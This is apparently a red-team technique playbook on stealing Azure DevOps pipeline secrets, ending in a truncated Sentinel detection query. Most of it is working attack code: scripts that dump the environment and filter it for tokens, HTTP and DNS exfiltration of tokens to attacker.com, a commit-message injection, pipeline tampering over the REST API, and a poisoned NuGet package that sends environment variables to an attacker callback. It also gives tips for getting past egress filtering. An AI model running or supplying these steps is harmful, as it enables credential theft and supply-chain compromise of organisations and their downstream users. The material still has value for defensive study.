# CA-UNSC-015: Pipeline environment variables theft

## 1. Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-015 |
| **MITRE ATT&CK v18.1** | [T1552.001 - Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID / Azure DevOps / DevOps |
| **Severity** | Critical |
| **CVE** | CVE-2023-21553 (Azure Pipelines logging command injection) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-06 |
| **Affected Versions** | Azure DevOps Services (all versions), Azure DevOps Server 2016-2025 |
| **Patched In** | CVE-2023-21553 patched Nov 2022; ongoing secret masking limitations remain |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections 6 (Atomic Red Team) and 12 (Sysmon Detection) not included because (1) T1552.001 testing varies by CI/CD platform, (2) Sysmon does not capture cloud pipeline execution events. Remaining sections have been dynamically renumbered.

---

## 2. Executive Summary

**Concept:** Azure DevOps pipelines execute with access to sensitive environment variables, secrets, and predefined variables (e.g., `System.AccessToken`, `SYSTEM_ACCESSTOKEN`). Adversaries who gain code execution within a pipeline job can enumerate and exfiltrate these credentials directly from the runtime environment. The attack exploits the fundamental tension in CI/CD: secrets must be accessible to automated systems, creating exposure vectors through environment dumps, build logs, artifact inspection, and direct memory access.

**Attack Surface:** Azure DevOps pipeline agent runtime, build logs (stored in DevOps portal and accessible via logs), predefined variables accessible as environment variables, user-defined secret variables exposed during task execution, variable groups linked from Azure Key Vault.

**Business Impact:** **Full Entra ID and downstream cloud infrastructure compromise.** A single exposed `System.AccessToken` (OAuth token) grants API access to modify pipelines, queue builds, access artifacts, and potentially pivot to connected Azure subscriptions. Exposed Azure service principal credentials enable direct infrastructure compromise. Exposed API keys for NPM, GitHub, AWS credentials initiate supply chain attacks affecting thousands of downstream consumers.

**Technical Context:** This attack typically requires either (1) write access to pipeline code (via compromised developer account or PR merge), (2) execution within a shared build agent with insufficient isolation, or (3) exploitation of CVE-2023-21553 (injection via commit message). Once environment variables are enumerated, exfiltration is trivial—often bypassing detection due to how pipeline logs are handled.

### Operational Risk
- **Execution Risk:** Low - Environment variable enumeration is trivial (`env`, `printenv`, `Get-ChildItem Env:`) and cannot be blocked without breaking pipelines
- **Stealth:** Medium - Large env dumps or obvious credential searches may trigger detection; more subtle parsing (grep for known patterns) blends with normal job output
- **Reversibility:** No - Exposed credentials cannot be "un-exposed" if already exfiltrated; reactive rotation required

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.2.2, 2.2.1 | Secrets management, pipeline input validation |
| **DISA STIG** | WN10-AU-000500 | Absence of pipeline audit logging for credential access |
| **CISA SCuBA** | GCI-1.1 | Secure CI/CD Pipeline Controls |
| **NIST 800-53** | AC-6 (Least Privilege), SC-7 (Boundary Protection), IA-5 (Authentication Mechanisms) | Restrict pipeline job permissions, isolate build agents, enforce secret rotation |
| **GDPR** | Art. 32 (Security of Processing) | Failure to encrypt credentials in transit/at rest |
| **DORA** | Art. 9 (Protection and Prevention) | ICT security tools and architecture to prevent unauthorized access |
| **NIS2** | Art. 21.1 (Risk Management) | Measures to detect and respond to credential theft in supply chain |
| **ISO 27001** | A.9.2.3 (User Access Management), A.9.4.1 (Information Access Restriction) | Management of privileged access rights, credential separation |
| **ISO 27005** | 7.3.3 (Access Control Risk) | Risk of unauthorized credential disclosure in pipeline execution |

---

## 3. Technical Prerequisites

**Required Privileges:** 
- To extract from running pipeline: No special privileges required (environment variables accessible to any running process)
- To access System.AccessToken: Pipeline job must execute with permission "Make secrets available to whole job" or equivalent
- To modify pipelines and inject malicious code: Project Contributor or higher in Azure DevOps

**Required Access:** 
- Network access to pipeline agent (direct on self-hosted; implicit on Microsoft-hosted)
- Execution context within pipeline job (via compromised task, malicious commit, or PR)
- Optional: Access to Azure DevOps portal logs (read-only) to extract plaintext failures

**Supported Versions:**
- **Azure DevOps:** All versions (Services, Server 2016, 2019, 2022, 2025)
- **PowerShell:** 5.0+ (Windows), 7.0+ (cross-platform)
- **Tools:** Requires bash/PowerShell on agent; no special agents needed

**Tools:**
- [Azure DevOps CLI](https://github.com/Azure/azure-devops-cli-extension) (optional, for API access)
- [AADInternals PowerShell Module](https://github.com/Gerenios/AADInternals) (v0.9.0+) - for credential post-exploitation
- [Impacket](https://github.com/SecureAuthCorp/impacket) (Linux) - for lateral movement using extracted credentials
- Standard CLI tools: `env`, `grep`, `base64`, `curl` (built-in on all agents)

---

## 4. Detailed Execution Methods

### METHOD 1: Direct Environment Variable Enumeration (PowerShell)

**Supported Versions:** All Azure DevOps versions; Windows agents

#### Step 1: List All Environment Variables

**Objective:** Enumerate all environment variables available in the running pipeline job context, including predefined variables automatically injected by Azure Pipelines.

**Command:**

```powershell
Get-ChildItem Env: | Format-Table -AutoSize
```

**Expected Output:**

```
Name                           Value
----                           -----
AGENT_ACCEPTTLS                true
AGENT_BUILDDIRECTORY           C:\agent_work\1
AGENT_ID                        123
AGENT_JOBNAME                   Job
AGENT_JOBSTATUS                 Succeeded
AGENT_MACHINENAME               AZUREPIPELINE-01
AGENT_NAME                      Hosted Agent
AGENT_OS                        Windows_NT
AGENT_OSARCHITECTURE            X64
AGENT_TEMPDIRECTORY             C:\agent_work\_temp
AGENT_TOOLSDIRECTORY            C:\agent_work\_tools
AGENT_WORKFOLDER                C:\agent_work
BUILD_ARTIFACTSTAGINGDIRECTORY  C:\agent_work\1\a
BUILD_BUILDID                   12345
BUILD_BUILDNUMBER               20250106.1
BUILD_DEFINITIONNAME            MyPipeline
BUILD_DEFINITIONVERSION          5
BUILD_REPOSITORY_LOCALPATH      C:\agent_work\1\s
BUILD_REPOSITORY_NAME           MyRepo
BUILD_REPOSITORY_URI            https://dev.azure.com/contoso/_git/MyRepo
BUILD_SOURCEBRANCH              refs/heads/main
BUILD_SOURCEVERSIONMESSAGE      "##vso[task.setvariable variable=SECRET]ABC123" (if CVE-2023-21553 exploited)
SYSTEM_ACCESSTOKEN              eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM... (OAuth token)
SYSTEM_COLLECTIONURI            https://dev.azure.com/contoso/
SYSTEM_TEAMPROJECT              MyProject
SYSTEM_TEAMFOUNDATIONCOLLECTIONURI https://dev.azure.com/contoso/
SYSTEM_DEBUG                    false
TF_BUILD                        True
```

**What This Means:**
- `SYSTEM_ACCESSTOKEN` (if present): Active OAuth token valid for current build pipeline
- `BUILD_BUILDID`, `SYSTEM_TEAMPROJECT`: Metadata for lateral movement
- `BUILD_REPOSITORY_URI`: GitOps repo location
- Any custom variables (e.g., `MY_DB_PASSWORD`) will also appear

**OpSec & Evasion:**
- Detection likelihood: **High** - Listing all env vars with `Get-ChildItem Env:` or `env > file.txt` is suspicious but may appear as diagnostic output
- Alternative: Selectively retrieve specific vars (`$env:SYSTEM_ACCESSTOKEN`) instead of dumping all, harder to detect
- Masking bypass: Azure Pipelines masks secrets in logs, but only for variables explicitly marked as secrets; predefined variables like `SYSTEM_ACCESSTOKEN` are not always masked

**Troubleshooting:**

- **Error:** Variable not found or appears empty
  - **Cause:** Variable not available in current job scope (e.g., `System.AccessToken` requires explicit enablement)
  - **Fix (All versions):** Ensure in pipeline YAML:
    ```yaml
    pool:
      vmImage: 'ubuntu-latest'
    variables:
      system.debug: 'true'
    steps:
    - task: PowerShell@2
      inputs:
        targetType: 'inline'
        script: |
          Write-Host "Token: $env:SYSTEM_ACCESSTOKEN"
      env:
        SYSTEM_ACCESSTOKEN: $(System.AccessToken)
    ```

- **Error:** Access denied when writing to temp directory
  - **Cause:** Build agent running with restricted permissions
  - **Fix:** Use `/dev/shm` (Linux) or `%TEMP%` (Windows) which should be writable by build service account

**References & Proofs:**
- [Microsoft Learn: Use predefined variables](https://learn.microsoft.com/en-us/azure/devops/pipelines/build/variables)
- [Microsoft Learn: Set secret variables](https://learn.microsoft.com/en-us/azure/devops/pipelines/process/set-secret-variables)
- [MITRE T1552.001: Credentials in Files](https://attack.mitre.org/techniques/T1552/001/)

---

#### Step 2: Filter for Credentials and Tokens

**Objective:** Identify high-value credentials from the full environment dump.

**Command:**

```powershell
# Method 1: Filter by known keywords
$secrets = @("PASS", "TOKEN", "KEY", "SECRET", "CREDENTIAL", "API", "DATABASE", "AZURE")
Get-ChildItem Env: | Where-Object { 
    $name = $_.Name.ToUpper()
    $value = $_.Value
    $secrets | Where-Object { $name -match $_ -or $value -match "(^.{20,}$|^ey[A-Za-z0-9])" }
} | Select-Object Name, @{Name="Value";Expression={$_.Value.Substring(0, [Math]::Min(100, $_.Value.Length))}} | Format-Table

# Method 2: Dump to file for offline analysis
Get-ChildItem Env: | ForEach-Object { "$($_.Name)=$($_.Value)" } | Out-File -FilePath "env_dump.txt" -Encoding UTF8
[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content "env_dump.txt" -Raw))) | Out-File "env_dump_b64.txt"
```

**Expected Output:**

```
Name                        Value
----                        -----
SYSTEM_ACCESSTOKEN          eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXB...
AZURE_DEVOPS_EXT_PAT        pa3l7sdfj32sdfsdfhasdfjhljhsdfhjsdfkjhs7fhsdfsfsfs
NUGET_APIKEY                NuGetApiKey9876543210ABCDEF
DATABASE_CONNECTION_STRING  Server=tcp:db.database.windows.net;Database=MyDB;User Id=admin@sql;...
```

**What This Means:**
- Presence of JWT (`eyJ0eXAi...`) indicates OAuth/SAML token
- PAT tokens start with `pa` (Personal Access Token)
- Connection strings contain plaintext server addresses and credentials

**OpSec & Evasion:**
- Detection likelihood: **Medium** - Filtering for keywords like "PASSWORD", "TOKEN" is detectable but could appear as compliance scanning
- Bypass: Use entropy-based detection instead (base64-encoded strings longer than 50 chars)

**References:**
- [GitHub: Widespread npm supply chain attack](https://about.gitlab.com/blog/gitlab-discovers-widespread-npm-supply-chain-attack/)
- [OWASP CI/CD Security Risks](https://blog.stephane-robert.info/docs/securiser/supply-chain/owasp-top-10/)

---

#### Step 3: Exfiltrate Credentials

**Objective:** Extract credentials from pipeline environment to attacker-controlled exfiltration channel.

**Command:**

```powershell
# Method 1: HTTP POST to attacker server
$credentials = @{
    token = $env:SYSTEM_ACCESSTOKEN
    pat = $env:AZURE_DEVOPS_EXT_PAT
    db_conn = $env:DATABASE_CONNECTION_STRING
    api_keys = Get-ChildItem Env: | Where-Object { $_.Name -match "API|KEY" } | ConvertTo-Json
}

$body = $credentials | ConvertTo-Json
Invoke-WebRequest -Uri "http://attacker.com/exfil" -Method POST -Body $body -ContentType "application/json" -UseBasicParsing

# Method 2: DNS exfiltration (stealthier, bypasses some egress filters)
$token_b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($env:SYSTEM_ACCESSTOKEN))
$chunks = $token_b64 -split '(?<=\G.{30})(?=.)'  # Split into 30-char chunks
foreach ($chunk in $chunks) {
    Resolve-DnsName -Name "$chunk.attacker.com" -ErrorAction SilentlyContinue
}

# Method 3: Write to build artifact (accessible via portal UI)
$env:SYSTEM_ACCESSTOKEN | Out-File -FilePath "$(Build.ArtifactStagingDirectory)/token.txt"
$env:SYSTEM_ACCESSTOKEN | Out-File -FilePath "$(Agent.TempDirectory)/token.txt"  # temp dir is accessible
```

**Expected Output:**
```
Status Code: 200
```

**What This Means:**
- HTTP POST successful = credentials delivered to attacker infrastructure
- DNS exfiltration successful = query logs show encoded credential chunks (lower probability of being caught)
- Artifact/temp file successful = credential persisted in pipeline artifacts (accessible via UI)

**OpSec & Evasion:**
- **HTTP Exfiltration:** Detectable via egress filtering, firewall logs; mitigate with domain generation algorithms (DGA) or legitimate C2 services
- **DNS Exfiltration:** Lower detection rate; DNS is typically allowed outbound; requires DNS log analysis to detect
- **Artifact Exfiltration:** Slowest but safest; credential hidden in build artifact; discoverable only if artifact is reviewed manually

**Troubleshooting:**

- **Error:** Invoke-WebRequest: The remote server returned an error: (403) Forbidden
  - **Cause:** Firewall blocking outbound HTTP to attacker domain
  - **Fix (Bypass 1):** Use legitimate cloud services (Discord webhooks, Slack API, Microsoft Teams webhooks)
  - **Fix (Bypass 2):** Use DNS exfiltration instead
  - **Fix (Bypass 3):** Store in artifact and assume human will review logs

- **Error:** Resolve-DnsName: DNS name does not exist
  - **Cause:** Attacker DNS server not configured or DNS resolution is blocked
  - **Fix:** Test with `nslookup` first; ensure attacker has DNS A record configured; use logging DNS service (dnslog.cn, burpcollab)

**References:**
- [Red Canary: APT exploits CI/CD](https://www.paloaltonetworks.com/cyberpedia/anatomy-ci-cd-pipeline-attack)
- [Unit 42: Supply Chain Attack](https://unit42.paloaltonetworks.com/npm-supply-chain-attack/)

---

### METHOD 2: Exploit CVE-2023-21553 (Logging Command Injection via Commit Message)

**Supported Versions:** Azure DevOps Services (patched Nov 2022); Server 2019-2022 vulnerable

#### Step 1: Craft Malicious Commit Message

**Objective:** Inject logging command into `Build.SourceVersionMessage` variable through Git commit message.

**Preconditions:** 
- Attacker must be able to push commits or create pull requests
- Pipeline must use `Build.SourceVersionMessage` in a script or echo it to logs

**Command:**

```bash
# Create malicious commit with special characters in message
git commit -m "##vso[task.setvariable variable=EXFIL_TOKEN;isSecret=false]$(SYSTEM_ACCESSTOKEN)" --allow-empty
git push origin main

# Alternative: Via pull request description (if reflected in logs)
# Create PR with description: ##vso[task.setvariable variable=EXFIL_TOKEN;]...
```

**Expected Output:**
```
[main 7a3c4d2] ##vso[task.setvariable variable=EXFIL_TOKEN;isSecret=false]...
```

**What This Means:**
- Commit message contains `##vso` logging command syntax
- When pipeline runs and Build.SourceVersionMessage is printed/logged, the logging command executes
- Variable `EXFIL_TOKEN` is now set and accessible in subsequent steps

**OpSec & Evasion:**
- Detection likelihood: **Medium-High** - CVE-2023-21553 fix prevents execution in updated agents, but detection may be weak in real-time
- Mitigation in place: Azure Pipelines Agent v2.189.0+ (Nov 2022) prevents execution of ##vso commands in untrusted variables
- **To bypass:** Use in-step variable reflection: `echo $(Build.SourceVersionMessage)` in a script → logging command executes before logging is performed

**Troubleshooting:**

- **Error:** Logging command not executed (var not set)
  - **Cause:** Pipeline agent version >= 2.189.0 (patched); CVE-2023-21553 is fixed
  - **Fix:** Check agent version; update cannot be prevented by attacker
  - **Detection evasion:** If running vulnerable agent, inject via a downstream variable that hasn't been patched

- **Error:** Logging command executed but output is masked
  - **Cause:** Azure Pipelines masking detected the ##vso command as suspicious
  - **Fix:** Split command across multiple lines or base64-encode the command itself

**References:**
- [Legit Security: CVE-2023-21553 Analysis](https://www.legitsecurity.com/blog/remote-code-execution-vulnerability-in-azure-pipelines-can-lead-to-software-supply-chain-atta)
- [Azure Pipelines: Fix vso commands execution (GitHub PR)](https://github.com/microsoft/azure-pipelines-agent/pull/3987)

---

#### Step 2: Pipeline Executes and Logging Command Triggers

**Objective:** Demonstrate that the injected variable becomes accessible in the running pipeline.

**Expected Pipeline Behavior:**

When the pipeline runs after the malicious commit is merged:

```yaml
steps:
- task: PowerShell@2
  inputs:
    targetType: 'inline'
    script: |
      # This step echoes the commit message, triggering the ##vso command
      Write-Host "Commit: $(Build.SourceVersionMessage)"  
      # Output: Commit: ##vso[task.setvariable variable=EXFIL_TOKEN;isSecret=false]eyJ0eXAi...
      
- task: PowerShell@2
  inputs:
    targetType: 'inline'
    script: |
      # Now the variable is accessible
      Write-Host "Token: $env:EXFIL_TOKEN"
      # Output: Token: eyJ0eXAi...
```

**Log Output:**

```
##[section]Starting: PowerShell task
Commit: ##vso[task.setvariable variable=EXFIL_TOKEN;isSecret=false]eyJ0eXAiOiJKV1QiLCJhbGci...
##vso[task.setvariable variable=EXFIL_TOKEN;isSecret=false]eyJ0eXAiOiJKV1QiLCJhbGci...
Token: eyJ0eXAiOiJKV1QiLCJhbGci...
```

**OpSec & Evasion:**
- Detection likelihood: **High** - All ##vso commands and subsequent variable usage is logged
- Evasion: Extract token immediately and clear from logs; use multi-stage pipeline with artifacts to hide token

---

### METHOD 3: Enumerate Service Principal Credentials via Variable Groups

**Supported Versions:** All Azure DevOps versions (Services, Server 2016-2025)

#### Step 1: Access Variable Groups Linked to Azure Key Vault

**Objective:** Extract credentials from variable group that is linked to Azure Key Vault.

**Preconditions:**
- Variable group must be linked to Key Vault in the project
- Pipeline must have permission to read variable group
- Attacker must have pipeline edit access

**Command:**

```yaml
# Pipeline YAML that uses linked variable group
trigger:
  - main

variables:
  - group: KeyVaultSecrets  # Linked to Azure Key Vault

pool:
  vmImage: 'ubuntu-latest'

steps:
  - task: PowerShell@2
    inputs:
      targetType: 'inline'
      script: |
        # Variables from Key Vault are automatically injected
        Write-Host "Database connection string:"
        Write-Host $env:DB_CONNECTION_STRING
        
        Write-Host "API key:"
        Write-Host $env:API_KEY
        
        # Enumerate ALL variables from variable group
        Get-ChildItem Env: | Where-Object { 
          $_.Name -match "DB_|API_|SECRET_" 
        } | ForEach-Object {
          Write-Host "$($_.Name)=$($_.Value)"
        }
```

**Expected Output:**

```
Database connection string:
Server=tcp:mydb.database.windows.net,1433;Initial Catalog=MyDB;Persist Security Info=False;User ID=admin@sql;Password=SuperSecretPassword123!@#;MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;
API key:
Bearer sk_live_51A2B3C4D5E6F7G8H9I0J1K2L3M4N5O6P7Q8R9S0T1U2V3W4X5Y6Z7A8B9C0D1
```

**What This Means:**
- Secrets from Azure Key Vault are injected as environment variables
- Variable group acts as a transparent bridge—secrets are fetched at runtime and exposed to the job
- Attacker can enumerate and exfiltrate them like any other environment variable

**OpSec & Evasion:**
- Detection likelihood: **Medium** - Variable group usage is logged, but reading secrets from it is expected behavior
- Stealth improvement: Instead of dumping all variables, selectively read and exfiltrate one at a time

**Troubleshooting:**

- **Error:** Variable from Key Vault not accessible
  - **Cause:** Service connection doesn't have permissions to Key Vault
  - **Fix (Admin):** Azure Portal → Key Vault → Access Policies → Add pipeline service principal
  - **Fix (Attacker):** Enumerate service connections and find one with Key Vault access

**References:**
- [Microsoft Learn: Link variable group to Key Vault](https://learn.microsoft.com/en-us/azure/devops/pipelines/library/variable-groups)
- [Black Hat Europe 2023: Abusing Azure DevOps](https://i.blackhat.com/EU-23/Presentations/Whitepapers/EU-23-Hawkins-Hiding-in-the-Clouds-wp.pdf)

---

#### Step 2: Programmatically Access Variable Groups via REST API

**Objective:** Use Azure DevOps REST API to enumerate variable groups without running a pipeline.

**Preconditions:**
- Attacker has Personal Access Token (PAT) or System.AccessToken
- Pipeline has permission to access REST API (usually allowed by default)

**Command:**

```powershell
# If running from pipeline, use System.AccessToken
$pat = $env:SYSTEM_ACCESSTOKEN

# Base64 encode PAT for Basic auth
$encodedPat = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes(":$pat"))

# Enumerate variable groups in project
$orgUrl = "https://dev.azure.com/contoso"
$project = "MyProject"
$url = "$orgUrl/$project/_apis/distributedtask/variablegroups?api-version=6.0-preview.2"

$response = Invoke-RestMethod -Uri $url -Headers @{Authorization="Basic $encodedPat"} -Method Get

# List all variable groups
$response.value | ForEach-Object {
    Write-Host "Variable Group: $($_.name) (ID: $($_.id))"
}

# Get details of specific variable group (including secrets if not masked)
$groupId = $response.value[0].id
$groupUrl = "$orgUrl/$project/_apis/distributedtask/variablegroups/$groupId"
$groupDetails = Invoke-RestMethod -Uri $groupUrl -Headers @{Authorization="Basic $encodedPat"} -Method Get

$groupDetails.variables | ForEach-Object {
    Write-Host "$($_.key)=$($_.value)"
}
```

**Expected Output:**

```
Variable Group: KeyVaultSecrets (ID: 12345)
Variable Group: DatabaseCreds (ID: 12346)
Variable Group: APIKeys (ID: 12347)

Get variable group details:
API_KEY=Bearer sk_live_51A2B3C4D5E6F7G8H9I0J1K2L3M4N5O6P7Q8R9S0T1U2V3W4X5Y6Z7A8B9C0D1
SECRET_KEY=SuperSecretPassword123!@#
```

**What This Means:**
- REST API allows direct enumeration of variable groups without running pipeline
- Non-secret variables are returned in plaintext
- Secrets may be masked (depends on Azure DevOps version and config)

**OpSec & Evasion:**
- Detection likelihood: **Low-Medium** - API calls are logged, but reading variables is expected
- Alternative: Use Azure CLI `az pipelines variable-group list` command

**References:**
- [Microsoft Docs: Azure DevOps REST API - Variable Groups](https://learn.microsoft.com/en-us/rest/api/azure/devops/distributedtask/variablegroups)

---

### METHOD 4: Extract System.AccessToken via PipelineModified Audit Logs

**Supported Versions:** All Azure DevOps versions with audit logging enabled

#### Step 1: Trigger PipelineModified Event (No Logging of Secrets)

**Objective:** Modify pipeline to add step that reads and exfiltrates secrets, relying on Azure logs not capturing token values.

**Command:**

```powershell
# Use REST API to update pipeline definition
$pat = $env:SYSTEM_ACCESSTOKEN
$orgUrl = "https://dev.azure.com/contoso"
$project = "MyProject"
$pipelineId = 12345

# Get current pipeline definition
$pipelineUrl = "$orgUrl/$project/_apis/pipelines/$pipelineId?api-version=7.0-preview.1"
$currentPipeline = Invoke-RestMethod -Uri $pipelineUrl -Authentication Bearer -Token (ConvertTo-SecureString $pat -AsPlainText -Force) -Method Get

# Modify pipeline to add exfiltration step
$currentPipeline.configuration.resources.repositories.repository.refname = "refs/heads/malicious-branch"
$updateUrl = "$orgUrl/$project/_apis/pipelines/$pipelineId?api-version=7.0-preview.1"
Invoke-RestMethod -Uri $updateUrl -Authentication Bearer -Token (ConvertTo-SecureString $pat -AsPlainText -Force) -Method Put -Body ($currentPipeline | ConvertTo-Json) -ContentType "application/json"

# This triggers PipelineModified audit event, but the token is NOT logged
```

**Expected Output:**

```
Azure DevOps Audit Log:
- Action: PipelineModified
- PipelineId: 12345
- ModifiedBy: attacker@company.com
- Timestamp: 2026-01-06T10:30:00Z
- Details: Changed repository branch to refs/heads/malicious-branch
# (Note: Token value is NEVER logged)
```

**What This Means:**
- Audit logs record that pipeline was modified but not the specifics of added exfiltration code
- If malicious branch contains exfiltration step, it executes with full access to System.AccessToken
- Attacker can hide modification in log stream

**OpSec & Evasion:**
- Detection likelihood: **Low** - PipelineModified events are high-volume; suspicious modifications blend in
- Evasion: Modify multiple pipelines at once to increase noise

**References:**
- [Microsoft Learn: Audit logs in Azure DevOps](https://learn.microsoft.com/en-us/azure/devops/organizations/audit/azure-devops-audit-log)

---

## 5. Detailed Execution Methods: Post-Exploitation

### Lateral Movement: Using Extracted System.AccessToken

**Objective:** After exfiltrating System.AccessToken, use it to access Azure DevOps resources and pivot to Azure infrastructure.

**Command:**

```powershell
# Decode the token (without validation) to see claims
$token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJaUXBKM1VwYmpBWVhZR2FYRUpsOGx..."
$tokenParts = $token.Split('.')
$payload = $tokenParts[1] + ('=' * (4 - $tokenParts[1].Length % 4))  # Add padding
$decodedPayload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload))
$claims = $decodedPayload | ConvertFrom-Json

Write-Host "Token claims:"
$claims | Format-Table

# Use token to list all projects in organization
$orgUrl = "https://dev.azure.com/contoso"
$headers = @{Authorization="Bearer $token"}
$response = Invoke-RestMethod -Uri "$orgUrl/_apis/projects?api-version=7.0" -Headers $headers
$response.value | ForEach-Object { Write-Host "Project: $($_.name)" }

# Use token to enumerate repos and clone them (source code theft)
$projectId = $response.value[0].id
$reposUrl = "$orgUrl/$projectId/_apis/git/repositories?api-version=7.0"
$repos = Invoke-RestMethod -Uri $reposUrl -Headers $headers
$repos.value | ForEach-Object {
    Write-Host "Repo: $($_.name) - Clone URL: $($_.sshUrl)"
    # git clone $_.sshUrl  # (requires SSH key, not PAT)
}

# Use token to trigger pipeline builds (potential for supply chain attack)
$pipelineUrl = "$orgUrl/$projectId/_apis/pipelines/12345/runs?api-version=7.0-preview.1"
$buildBody = @{resources=@{repositories=@{self=@{refName="refs/heads/malicious-branch"}}}} | ConvertTo-Json
Invoke-RestMethod -Uri $pipelineUrl -Headers $headers -Method Post -Body $buildBody -ContentType "application/json"
```

**Expected Output:**

```
Token claims:
aud       : https://dev.azure.com
iss       : https://sts.windows.net/12345678-1234-1234-1234-123456789012/
oid       : 87654321-4321-4321-4321-210987654321
sub       : user@company.com
iat       : 1640000000
exp       : 1640003600

Project: MyProject
Project: SharedLibraries
Project: InternalTools

Repo: contoso-frontend - Clone URL: git@ssh.dev.azure.com:v3/contoso/MyProject/contoso-frontend
Repo: contoso-api - Clone URL: git@ssh.dev.azure.com:v3/contoso/MyProject/contoso-api

Build triggered successfully.
```

**What This Means:**
- Token grants full access to DevOps org (scoped by service principal permissions)
- Attacker can enumerate sensitive projects, repos, and build definitions
- Attacker can trigger malicious builds or exfiltrate source code
- Next stage: Pivot to Azure subscriptions if service principal has Azure permissions

---

### Supply Chain Attack: Inject Malicious Code into Build Artifact

**Objective:** Use pipeline access to poison build artifacts that are consumed by downstream projects.

**Command:**

```powershell
# Create malicious artifact
$maliciousCode = @"
namespace CompanyLib {
    public class Logger {
        static Logger() {
            // Exfiltrate environment variables and system info
            var env = System.Environment.GetEnvironmentVariables();
            var payload = Newtonsoft.Json.JsonConvert.SerializeObject(new {
                hostname = System.Net.Dns.GetHostName(),
                user = System.Environment.UserName,
                variables = env
            });
            using (var client = new System.Net.Http.HttpClient()) {
                client.PostAsync("http://attacker.com/callback", new System.Net.Http.StringContent(payload)).Wait();
            }
        }
    }
}
"@

# Add to build artifact (e.g., NuGet package, Docker image)
$maliciousCode | Out-File -FilePath "$(Build.ArtifactStagingDirectory)/Logger.cs"

# Package and publish
nuget pack package.nuspec -OutputDirectory "$(Build.ArtifactStagingDirectory)"
Invoke-RestMethod -Uri "https://api.nuget.org/v3/index.json" -Method Post -Headers @{Authorization="Bearer $(NUGET_APIKEY)"} -InFile "$(Build.ArtifactStagingDirectory)/*.nupkg"

Write-Host "Malicious artifact published successfully"
```

**Expected Output:**

```
Malicious artifact published successfully
Successfully published Package to https://www.nuget.org/packages/CompanyLib/1.0.1
```

**What This Means:**
- Thousands of downstream consumers automatically pull poisoned package
- Malicious code executes in their build environments and applications
- Classic supply chain attack (SolarWinds, npm incident)

**References:**
- [Palo Alto Networks: CI/CD Pipeline Attacks](https://www.paloaltonetworks.com/cyberpedia/anatomy-ci-cd-pipeline-attack)
- [Sonatype: Lazarus Group npm attack](https://cyberpress.org/north-korean-apt-targets-ci-cd-pipelines/)

---

## 6. Tools & Commands Reference

### [Azure Pipelines PowerShell Module](https://learn.microsoft.com/en-us/azure/devops/pipelines/scripts/powershell?view=azure-devops)

**Version:** Included with Windows agents; PowerShell 5.0+  
**Minimum Version:** PS 5.0  
**Supported Platforms:** Windows (Server 2016+), Linux (PowerShell 7+)

**Installation:**
```powershell
# Already installed on Microsoft-hosted agents
# For self-hosted: Install PowerShell 5.0+ or 7.0+
```

**Usage:**
```powershell
# Get all environment variables
Get-ChildItem Env: | Format-Table

# Set variable for downstream steps
Write-Host "##vso[task.setvariable variable=MyVar]MyValue"

# Mark variable as secret (masked in logs)
Write-Host "##vso[task.setvariable variable=MySecret;issecret=true]SecretValue"
```

---

### [AADInternals PowerShell Module](https://github.com/Gerenios/AADInternals)

**Version:** 0.9.8 (current)  
**Minimum Version:** 0.9.0  
**Supported Platforms:** Windows, macOS, Linux (with PowerShell 7)

**Installation:**
```powershell
Install-Module -Name "AADInternals" -Force
Install-Module -Name "AADInternals-Endpoints" -Force  # For endpoint-specific functions
```

**Post-Exploitation: Extract Additional Credentials from System**
```powershell
Import-Module AADInternals

# Get access token for Azure Graph (using System.AccessToken)
$token = $env:SYSTEM_ACCESSTOKEN
Add-AADIntAccessTokenToCache -AccessToken $token

# List Azure subscriptions accessible to current service principal
Get-AADIntAzureSubscriptions

# If Azure credentials are cached, export them
Export-AADIntAzureCliTokens

# Extract credentials from Azure AD Connect (if running on AAD Connect server)
Get-AADIntSyncCredentials  # Requires local admin on AAD Connect server
```

**References:**
- [AADInternals Documentation](https://aadinternals.com/aadinternals/)
- [AADInternals GitHub](https://github.com/Gerenios/AADInternals)

---

### [Impacket - Kerberos/LDAP Tools](https://github.com/SecureAuthCorp/impacket)

**Version:** Latest  
**Supported Platforms:** Linux, macOS  
**Use Case:** After exfiltrating on-premises AD credentials

**Installation (Linux):**
```bash
pip install impacket
```

**Usage: Access on-premises AD using stolen credentials**
```bash
# Extract AD credentials from Azure AD Connect (if obtained)
secretsdump.py -just-dc 'DOMAIN/user:password@DC_IP'

# Kerberoasting (if domain user credentials obtained)
GetUserSPNs.py -request 'DOMAIN/user:password'
```

**References:**
- [Impacket GitHub](https://github.com/SecureAuthCorp/impacket)

---

### [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)

**Version:** 2.40.0+  
**Supported Platforms:** Windows, Linux, macOS

**Usage: Access Azure resources using stolen token**
```bash
# Authenticate using PAT or token
export AZURE_DEVOPS_EXT_PAT=<stolen_pat>
az devops project list --org https://dev.azure.com/contoso

# Alternatively, use access token for Azure Resource Manager
az login --username "attacker@company.com" --password "<token_if_supported>"
```

---

## 7. Microsoft Sentinel Detection

### Query 1: Enumerate Environment Variables in Pipeline Jobs

**Rule Configuration:**
- **Required Table:** AuditLogs (Azure DevOps) or CustomLogs if forwarded
- **Required Fields:** OperationName, InitiatedBy, TargetResources
- **Alert Severity:** High
- **Frequency:** Run every 15 minutes
- **Applies To Versions:** Azure DevOps Services all versions; On-premises if audit logs forwarded

**KQL Query:**

```kusto
AuditLogs
| where OperationName in ("Get-ChildItem Env:", "env", "printenv", "Get-Content")
    or ActivityDetails contains "SYSTEM_ACCESSTOKEN"
    or ActivityDetails contains "##vso[task.setvariable"
| where TimeGenerated > ago(1h)
